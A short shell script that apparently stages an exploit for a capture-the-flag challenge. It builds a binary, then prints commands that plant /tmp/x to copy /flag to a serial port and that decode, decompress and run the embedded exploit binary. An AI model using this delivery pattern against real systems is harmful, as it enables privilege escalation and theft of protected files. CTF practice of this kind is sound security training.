#!/bin/sh
make || exit 1

echo 'echo "#!/bin/sh" > /tmp/x'
echo 'echo "cat /flag > /dev/ttyS0" >> /tmp/x'
echo 'chmod +x /tmp/x'

echo 'cd /tmp; base64 -d <<EOF | xz -d > a && chmod +x a && ./a'
XZ_DEFAULTS= xz -T09 < main | base64
echo 'EOF'
